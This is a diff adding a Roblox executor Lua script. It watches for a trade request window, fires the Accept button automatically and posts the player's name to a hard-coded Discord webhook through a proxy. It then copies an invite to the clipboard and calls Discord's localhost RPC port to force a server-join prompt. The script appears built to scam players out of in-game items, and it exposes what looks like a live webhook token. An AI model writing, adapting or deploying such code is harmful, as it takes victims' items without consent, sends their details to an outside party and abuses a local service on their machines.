@@ -1,0 +1,86 @@
+-- // CONFIGURATION
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1466982778511032445/ZmHdv5FUPYL_xbsv7ebivxFdxvFa7kN58wBFhxpHq1EWAVX9ij-dIyumFa3XflebXcGO"
+local DISCORD_INVITE = "https://discord.gg/quyxhub" -- URL ng invite mo
+
+-- // SERVICES
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- // PROXY (Discord blocks Roblox requests)
+local ProxyWebhook = WEBHOOK_URL:gsub("discord.com", "hooks.hyra.io")
+
+-- // FUNCTION: Join Action
+local function triggerAutoJoin()
+    -- 1. Copy sa Clipboard (Pinaka-common sa executors)
+    if setclipboard then
+        setclipboard(DISCORD_INVITE)
+        print("Invite URL copied to clipboard!")
+    end
+
+    -- 2. Buksan ang Browser (Kung supported ng executor mo)
+    local request = syn and syn.request or http_request or request or HttpPost
+    if request then
+        pcall(function()
+            -- Binubuksan ang browser para mag-prompt ang Discord desktop app
+            request({
+                Url = "http://localhost:6463/rpc?v=1", -- Discord RPC port
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["Origin"] = "https://discord.com"
+                },
+                Body = HttpService:JSONEncode({
+                    ["cmd"] = "INVITE_BROWSER",
+                    ["args"] = {["code"] = DISCORD_INVITE:gsub("https://discord.gg/", "")},
+                    ["nonce"] = "random"
+                })
+            })
+        end)
+    end
+end
+
+-- // FUNCTION: Notification
+local function notifyDiscord()
+    local payload = {
+        ["content"] = "@everyone ðŸš¨ **NEW TRADE ACCEPTED!**",
+        ["embeds"] = {{
+            ["title"] = "Trade Received",
+            ["description"] = "User: **" .. LocalPlayer.Name .. "** is joining the server.",
+            ["color"] = 16711680
+        }}
+    }
+    pcall(function()
+        HttpService:PostAsync(ProxyWebhook, HttpService:JSONEncode(payload))
+    end)
+end
+
+-- // MAIN MONITOR
+task.spawn(function()
+    print("System Running: Waiting for Trade UI...")
+    while task.wait(0.5) do
+        -- Base sa path na binigay mo: ReplicatedStorage.Client.Controllers.UI.TradeRequestUI
+        -- Pero karaniwan ay nasa PlayerGui ito lumalabas
+        local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("TradeRequestUI", true)
+        
+        if tradeUI and tradeUI.Visible then
+            local acceptBtn = tradeUI:FindFirstChild("Accept", true) or tradeUI:FindFirstChild("Confirm", true)
+            
+            if acceptBtn then
+                -- 1. AUTO ACCEPT
+                for _, connection in pairs(getconnections(acceptBtn.MouseButton1Click)) do
+                    connection:Fire()
+                end
+                
+                -- 2. LOG & NOTIFY EVERYONE
+                notifyDiscord()
+                
+                -- 3. FORCED JOIN / PROMPT
+                triggerAutoJoin()
+                
+                -- Paunawa para hindi mag-spam sa iisang trade
+                repeat task.wait(1) until not tradeUI.Visible
+            end
+        end
+    end
+end)
